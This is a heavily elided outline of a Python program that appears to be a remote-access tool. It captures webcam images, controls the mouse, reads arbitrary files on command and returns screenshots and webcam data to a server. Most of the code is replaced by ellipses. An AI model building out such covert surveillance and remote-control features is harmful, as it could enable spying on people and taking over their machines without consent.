...
class WebcamCapture:
    ...
    def capture(camera_index=0, quality=55):
        ...
        # Fallback: Windows WIA / macOS imagesnap
        if platform.system() == 'Darwin':
            try:
                tmp = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
                tmp.close()
...
class MouseControl:
    ...
    def execute(cmd_str: str) -> str:
        ...
        if not HAS_PYNPUT_MOUSE:
            # Fallback: use xdotool on Linux / AutoHotkey stub on Windows
...
class CommandExecutor:
    ...
    def execute(cmd):
        try:
            ...
            # ── List directory (current or specified path) ─────────────────────
            ...
            if cmd_lower.startswith('cat '):
                try:
                    return {'type': 'cmd_result',
                            'output': Path(cmd[4:].strip()).read_text(
                                errors='ignore')[:10000]}
                except Exception as e:
        ...
        try:
            ...
            for cmd in response.get('cmds', []):
                ...
                if rtype in ('screenshot', 'snapshot', 'webcam') and result.get('data'):
                    key = result.get('data_key', 'screen_b64')
